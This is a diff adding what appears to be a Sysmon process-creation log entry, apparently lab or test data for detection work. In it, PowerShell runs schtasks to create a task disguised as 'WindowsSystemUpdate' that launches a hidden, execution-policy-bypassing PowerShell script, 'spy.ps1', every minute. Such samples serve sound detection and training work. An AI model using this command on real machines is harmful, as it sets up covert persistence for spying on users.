@@ -1,0 +1,24 @@
+Process Create:
+RuleName: -
+UtcTime: 2026-05-17 07:19:01.214
+ProcessGuid: {3f3c9205-6be5-6a09-4901-000000001500}
+ProcessId: 5696
+Image: C:\Windows\System32\schtasks.exe
+FileVersion: 10.0.19041.5965 (WinBuild.160101.0800)
+Description: Task Scheduler Configuration Tool
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: schtasks.exe
+CommandLine: "C:\Windows\system32\schtasks.exe" /create /tn WindowsSystemUpdate /tr "powershell.exe -WindowStyle HiDden -NoProfile -ExecutionPolicy BypaSs -File C:\Users\Public\spy.ps1" /sc MINUTE /mo 1 /f
+CurrentDirectory: C:\Users\Victim\
+User: DESKTOP-4U5SKL5\Victim
+LogonGuid: {3f3c9205-6aac-6a09-f3ba-060000000000}
+LogonId: 0x6BAF3
+TerminalSessionId: 1
+IntegrityLevel: Medium
+Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642
+ParentProcessGuid: {3f3c9205-6be1-6a09-4701-000000001500}
+ParentProcessId: 948
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+ParentUser: DESKTOP-4U5SKL5\Victim
